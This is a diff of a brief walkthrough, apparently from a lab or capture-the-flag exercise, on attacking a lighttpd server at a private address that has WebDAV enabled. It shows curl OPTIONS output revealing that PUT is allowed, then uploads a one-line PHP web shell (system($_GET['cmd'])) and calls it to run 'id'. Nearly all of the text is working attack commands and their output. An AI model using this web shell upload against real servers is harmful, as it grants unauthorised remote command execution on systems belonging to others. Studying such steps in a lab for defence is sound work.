@@ -1,5 +1,30 @@
-curl -v -X OPTIONS http://10.0.2.13/test
+First we have to check what option are avaible for us by type command listed below:
+--> curl -X OPTIONS -v http://10.0.2.13/test/
 
-curl -v -X PUT -d ‘<?php system ($_GET[“cmd”]); ?>’ http://10.0.2.13/test/shell.php
+Output will be similar to this one:
+
+*   Trying 10.0.2.13...
+* TCP_NODELAY set
+* Connected to 10.0.2.13 (10.0.2.13) port 80 (#0)
+> OPTIONS /test/ HTTP/1.1
+> Host: 10.0.2.13
+> User-Agent: curl/7.56.1
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< DAV: 1,2
+< MS-Author-Via: DAV
+< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
+< Allow: OPTIONS, GET, HEAD, POST
+< Content-Length: 0
+< Date: Sun, 14 Jan 2018 12:21:51 GMT
+< Server: lighttpd/1.4.28
+< 
+* Connection #0 to host 10.0.2.13 left intact
+
+Now we can see that there is enable option PUT which will allow us to upload some files to vualnarble directory.
+
+--> curl --upload-file test.txt -v --url http://10.0.2.13/test/test.txt -0 --http1.0
+--> curl -v -X PUT -d ‘<?php system ($_GET[“cmd”]); ?>’ http://10.0.2.13/test/shell.php
 
 10.0.2.13/test/shell.php?cmd=id
